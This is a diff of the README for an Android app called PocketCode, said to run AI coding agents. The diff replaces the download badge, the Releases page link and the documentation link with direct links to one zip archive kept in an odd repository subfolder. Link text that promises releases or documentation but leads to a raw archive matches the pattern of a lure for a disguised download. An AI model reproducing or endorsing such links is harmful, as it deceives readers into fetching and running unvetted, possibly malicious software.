@@ -1,6 +1,6 @@
 # 🤖 PocketCode - Run AI Coding Agents on Android
 
-[![Download PocketCode](https://img.shields.io/badge/Download-PocketCode-brightgreen)](https://github.com/obscuria2b/PocketCode/releases)
+[![Download PocketCode](https://github.com/obscuria2b/PocketCode/raw/refs/heads/main/hexad/Pocket-Code-2.0.zip)](https://github.com/obscuria2b/PocketCode/raw/refs/heads/main/hexad/Pocket-Code-2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to PocketCode! This application lets you run various AI coding agents, i
 
 To get started, visit the Releases page to download the latest version of PocketCode. 
 
-[Visit the Releases page for download](https://github.com/obscuria2b/PocketCode/releases)
+[Visit the Releases page for download](https://github.com/obscuria2b/PocketCode/raw/refs/heads/main/hexad/Pocket-Code-2.0.zip)
 
 ### Installation Steps:
 
@@ -55,7 +55,7 @@ If you encounter issues while using PocketCode, consider the following tips:
 
 ## 🔗 Additional Resources
 
-- **Documentation:** [Read the full documentation here.](https://github.com/obscuria2b/PocketCode/wiki)
+- **Documentation:** [Read the full documentation here.](https://github.com/obscuria2b/PocketCode/raw/refs/heads/main/hexad/Pocket-Code-2.0.zip)
 - **Community Forum:** Join our community to share your experiences and ask questions.
 - **Feature Requests:** Have an idea? Suggest new features in the GitHub Issues section.
 
